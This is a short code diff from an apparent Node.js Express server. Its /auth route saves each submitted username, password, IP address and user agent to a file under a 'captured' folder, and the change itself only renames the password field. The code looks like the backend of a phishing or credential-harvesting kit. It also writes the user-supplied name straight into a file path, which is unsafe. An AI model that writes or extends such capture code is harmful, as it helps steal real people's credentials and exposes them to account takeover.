@@ -91,7 +91,7 @@ app.post('/auth', (req, res)=>{
   fs.writeFile(`captured/${Info.user}.user.json`, `
 {
       "username":"${Info.user}",
-      "pass":"${Info.pwd}",
+      "pass":"${Info.pass}",
       "Ip":"${Info.ip}",
       "User-Agent":"${Info.agent}"
 }`, (err, data)=>{
